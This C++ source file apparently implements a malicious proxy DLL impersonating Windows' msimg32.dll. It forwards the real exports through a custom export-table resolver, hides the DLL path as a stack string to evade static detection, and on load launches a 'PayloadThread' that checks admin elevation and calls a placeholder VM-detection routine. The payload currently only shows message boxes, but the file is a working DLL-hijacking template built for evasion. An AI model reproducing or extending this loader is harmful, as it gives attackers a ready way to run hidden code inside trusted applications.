#include <windows.h>
#include <process.h>

#ifndef NT_SUCCESS
    #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)

extern "C" {
    UINT_PTR pAlphaBlend = 0;
    UINT_PTR pDllInitialize = 0;
    UINT_PTR pGradientFill = 0;
    UINT_PTR pTransparentBlt = 0;
    UINT_PTR pvSetDdrawflag = 0;
}


typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);
pfnLoadLibraryA pLoadLibraryA = &LoadLibraryA;


//============================================================================

__declspec(noinline) bool __stdcall isSame(const char* a, const char* b)
{
    while(*a && *b)
    {
        char ca = *a, cb = *b;
        if(ca >= 'A' && ca <= 'Z') ca += ('a' - 'A');
        if(cb >= 'A' && cb <= 'Z') cb += ('a' - 'A');
        if(ca != cb) return false;
        ++a; ++b;
    }
    return (*a == '\0' && *b == '\0');
}

__declspec(noinline) static void* __stdcall ShellcodeFindExportAddress(HMODULE hModule, LPCSTR lpProcNameOrOrdinal, pfnLoadLibraryA pLoadLibraryAFunc)
{
    //-----------

    if(!hModule) return nullptr;

    BYTE* base = (BYTE*)hModule;
        
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if(nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    IMAGE_DATA_DIRECTORY* pExportDataDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; // Use a pointer for clarity
    if (pExportDataDir->VirtualAddress == 0 || pExportDataDir->Size == 0) return nullptr;

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + pExportDataDir->VirtualAddress);
    DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions); // RVAs to function bodies or forwarders

    //-----------

    // --- DIFFERENTIATE NAME VS ORDINAL ---
    bool isOrdinalLookup = false;
    WORD ordinalToFind = 0;

    #if defined(_WIN64)
        if (((ULONG_PTR)lpProcNameOrOrdinal >> 16) == 0)    // High bits of pointer are zero
        {
            isOrdinalLookup = true;
            ordinalToFind = LOWORD((ULONG_PTR)lpProcNameOrOrdinal);
        }
    #else // For 32-bit shellcode
        // For 32-bit, HIWORD macro is on a DWORD. ULONG_PTR might be 64-bit if compiled for x64 targeting x86.
        // Ensure lpProcNameOrOrdinal is treated as a 32-bit value for HIWORD.
        if (HIWORD((DWORD)(ULONG_PTR)lpProcNameOrOrdinal) == 0)
        { 
            isOrdinalLookup = true;
            ordinalToFind = LOWORD((DWORD)(ULONG_PTR)lpProcNameOrOrdinal);
        }
    #endif
    // --- END DIFFERENTIATION LOGIC ---

    DWORD funcRVA = 0; // RVA of the function/forwarder

    if (isOrdinalLookup)
    {
        if (ordinalToFind < exp->Base || (ordinalToFind - exp->Base) >= exp->NumberOfFunctions)
        {
            // LOG_W(L"    [SFEA] Ordinal %hu is out of range (Base: %u, NumberOfFunctions: %u)", ordinalToFind, exp->Base, exp->NumberOfFunctions);
            return nullptr;
        }
            
        DWORD functionIndexInArray = ordinalToFind - exp->Base;
        if (functionIndexInArray >= exp->NumberOfFunctions) return nullptr;
            
        funcRVA = functions[functionIndexInArray];
    }
    else
    {
        // --- NAME LOOKUP PATH ---
        LPCSTR funcName = lpProcNameOrOrdinal;
        if (!funcName || *funcName == '\0') return nullptr;

        DWORD* nameRVAs = (DWORD*)(base + exp->AddressOfNames);          // RVAs to ASCII name strings
        WORD* nameOrdinals = (WORD*)(base + exp->AddressOfNameOrdinals); // Indices into the 'functions' array (NOT necessarily the export ordinals themselves)

        bool foundByName = false;
        for (DWORD i = 0; i < exp->NumberOfNames; ++i)
        {
            char* currentExportName = (char*)(base + nameRVAs[i]);
            
            if (isSame(currentExportName, funcName)) 
            {
                WORD functionIndexInArray = nameOrdinals[i];            //index into the 'functions' array
            
                // Bounds check for the index obtained from nameOrdinals
                if (functionIndexInArray >= exp->NumberOfFunctions)
                {
                    // LOG_W(L"Name '%hs' gave an ordinal array index %hu out of bounds (%u).", funcName, functionIndexInArray, exp->NumberOfFunctions);
                    return nullptr;
                }

                funcRVA = functions[functionIndexInArray];
                if (funcRVA == 0) return nullptr; // Should not happen for a named export pointing to a valid index

                foundByName = true;
                break;
            }
        }
        
        if(!foundByName)
        {
            // LOG_W(L"Name '%hs' not found in export table.", funcName);
            return nullptr;
        }
    }

    if (funcRVA == 0)
    {
        // LOG_W(L"RVA for %p in module 0x%p is zero.", lpProcNameOrOrdinal, hModule);
        return nullptr; // No valid RVA found
    } 

    BYTE* addr = base + funcRVA;

    // Check if this RVA points within the export directory itself (indicates a forwarded export)
    if (funcRVA >= pExportDataDir->VirtualAddress && funcRVA < (pExportDataDir->VirtualAddress + pExportDataDir->Size)) 
    {
        // This is a forwarder string like "OTHERDLL.OtherFunction"
        char* originalForwarderString = (char*)addr;
        // LOG_W(L"    [SFEA] Proc %p from module 0x%p is forwarded to: '%hs'", lpProcNameOrOrdinal, hModule, originalForwarderString);

        if (!pLoadLibraryAFunc)
        {
            // LOG_W(L"    [SFEA] pLoadLibraryAFunc is nullptr, cannot resolve forwarder for %hs", originalForwarderString);
            return nullptr;
        }

        // --- PARSING: Work with a local, writable copy ---
        char localForwarderBuffer[256];
        UINT k_copy = 0;
            
        char* pOrig = originalForwarderString;
        while (*pOrig != '\0' && k_copy < (sizeof(localForwarderBuffer) - 1))
        {
            localForwarderBuffer[k_copy++] = *pOrig++;
        }
        localForwarderBuffer[k_copy] = '\0';


        char* dotSeparatorInLocal = nullptr;
        char* tempParserPtr = localForwarderBuffer;

        while (*tempParserPtr != '\0') 
        {
            if (*tempParserPtr == '.')
            {
                dotSeparatorInLocal = tempParserPtr;
                break;
            }
            ++tempParserPtr;
        }
        if (!dotSeparatorInLocal || dotSeparatorInLocal == localForwarderBuffer) { /*LOG_W(L"    [SFEA] Malformed forwarder string (in copy): '%hs'", localForwarderBuffer);*/ return nullptr; }


        *dotSeparatorInLocal = '\0'; 
        char* forwardedFuncNameOrOrdinalStr = dotSeparatorInLocal + 1;
        if (*forwardedFuncNameOrOrdinalStr == '\0') { /*LOG_W(L"    [SFEA] Malformed forwarder string (nothing after dot in copy): '%hs'", localForwarderBuffer);*/ return nullptr; }
            
        char* forwardedDllName = localForwarderBuffer;
        HMODULE hForwardedModule = pLoadLibraryAFunc(forwardedDllName);
        if (!hForwardedModule)
        {
            // LOG_W(L"    [SFEA] Failed to load forwarded DLL: '%hs' (original forwarder was: '%hs')", forwardedDllName, originalForwarderString);
            return nullptr;
        }

        // LOG_W(L"    [SFEA] Successfully loaded forwarded DLL: '%hs' to 0x%p", forwardedDllName, (void*)hForwardedModule);

        LPCSTR finalProcNameToResolve;
        if (*forwardedFuncNameOrOrdinalStr == '#') // Forwarding to an ordinal, e.g., "#123"
        {
            WORD fwdOrdinal = 0;
            char* pNum = forwardedFuncNameOrOrdinalStr + 1; // Skip '#'
            while (*pNum >= '0' && *pNum <= '9')
            {
                fwdOrdinal = fwdOrdinal * 10 + (*pNum - '0');
                pNum++;
            }

            // Check if any digits were actually parsed for the ordinal
            if (pNum == (forwardedFuncNameOrOrdinalStr + 1) && fwdOrdinal == 0)  // No digits after #, or #0 was not intended
            {
                if (*(forwardedFuncNameOrOrdinalStr + 1) != '0' || *(forwardedFuncNameOrOrdinalStr + 2) != '\0')    // Allow "#0" but not "#" or "#abc"
                {
                    // LOG_W(L"    [SFEA] Invalid forwarded ordinal format (no valid number after #): %hs", forwardedFuncNameOrOrdinalStr);
                    return nullptr;
                }
            }
                
            finalProcNameToResolve = (LPCSTR)(ULONG_PTR)fwdOrdinal;
            // LOG_W(L"    [SFEA] Forwarding to ordinal %hu in '%hs'", fwdOrdinal, forwardedDllName);
        } 
        else // Forwarding to a name
        {
            finalProcNameToResolve = forwardedFuncNameOrOrdinalStr;
            // LOG_W(L"    [SFEA] Forwarding to name '%hs' in '%hs'", finalProcNameToResolve, forwardedDllName);
        }

        return ShellcodeFindExportAddress(hForwardedModule, finalProcNameToResolve, pLoadLibraryAFunc);
    }       
    else return (void*)addr;
}

//============================================================================


void static SetupProxies()
{
    // 1. Construct the path on the stack (Stack String)
    // This prevents the string "msimg32.dll" from appearing in the binary.
    // We build: "C:\Windows\System32\msimg32.dll"
    wchar_t realPath[MAX_PATH];
    
    // "C:\"
    realPath[0] = 'C'; realPath[1] = ':'; realPath[2] = '\\';
    
    // "Windows"
    realPath[3] = 'W'; realPath[4] = 'i'; realPath[5] = 'n'; realPath[6] = 'd';
    realPath[7] = 'o'; realPath[8] = 'w'; realPath[9] = 's'; realPath[10] = '\\';
    
    // "System32"
    realPath[11] = 'S'; realPath[12] = 'y'; realPath[13] = 's'; realPath[14] = 't';
    realPath[15] = 'e'; realPath[16] = 'm'; realPath[17] = '3'; realPath[18] = '2';
    realPath[19] = '\\';
    
    // "msimg32.dll"
    realPath[20] = 'm'; realPath[21] = 's'; realPath[22] = 'i'; realPath[23] = 'm';
    realPath[24] = 'g'; realPath[25] = '3'; realPath[26] = '2'; realPath[27] = '.';
    realPath[28] = 'd'; realPath[29] = 'l'; realPath[30] = 'l'; realPath[31] = '\0';

    // 2. Load the Library
    // We use LoadLibraryW (Wide char) because we built a wchar_t string
    HMODULE hReal = LoadLibraryW(realPath);
    if(hReal)
    {
        //pAlphaBlend     = (UINT_PTR)GetProcAddress(hReal, "AlphaBlend");
        //pDllInitialize  = (UINT_PTR)GetProcAddress(hReal, "DllInitialize");
        //pGradientFill   = (UINT_PTR)GetProcAddress(hReal, "GradientFill");
        //pTransparentBlt = (UINT_PTR)GetProcAddress(hReal, "TransparentBlt");
        //pvSetDdrawflag  = (UINT_PTR)GetProcAddress(hReal, "vSetDdrawflag");

        pAlphaBlend = (UINT_PTR)ShellcodeFindExportAddress(hReal, "AlphaBlend", pLoadLibraryA);
        pDllInitialize = (UINT_PTR)ShellcodeFindExportAddress(hReal, "DllInitialize", pLoadLibraryA);
        pGradientFill   = (UINT_PTR)ShellcodeFindExportAddress(hReal, "GradientFill", pLoadLibraryA);
        pTransparentBlt = (UINT_PTR)ShellcodeFindExportAddress(hReal, "TransparentBlt", pLoadLibraryA);
        pvSetDdrawflag  = (UINT_PTR)ShellcodeFindExportAddress(hReal, "vSetDdrawflag", pLoadLibraryA);

    }
}

NTSTATUS static checkVM()
{


    return STATUS_SUCCESS;
}

unsigned __stdcall PayloadThread(void* pArguments)
{
    Sleep(1000);

    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    
    if(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        
        if(GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) fRet = Elevation.TokenIsElevated;
    }

    if(hToken) CloseHandle(hToken);

    if(fRet) MessageBoxA(NULL, "PayloadThread Started with Admin privilages", "Notification", MB_OK);
    else MessageBoxA(NULL, "PayloadThread Started without Admin privilages", "Notification", MB_OK);
    

    if(!NT_SUCCESS(checkVM()))
    {
        MessageBoxA(NULL, "VM is Detected", "Notification", MB_OK);
        return 0;
    }

    MessageBoxA(NULL, "No VM Detected", "Notification", MB_OK);


    return 0;
}

BOOL static APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        {
            DisableThreadLibraryCalls(hModule);
        

            SetupProxies();
            _beginthreadex(NULL, 0, PayloadThread, NULL, 0, NULL);

            break;
        }
    }


    return TRUE;
}
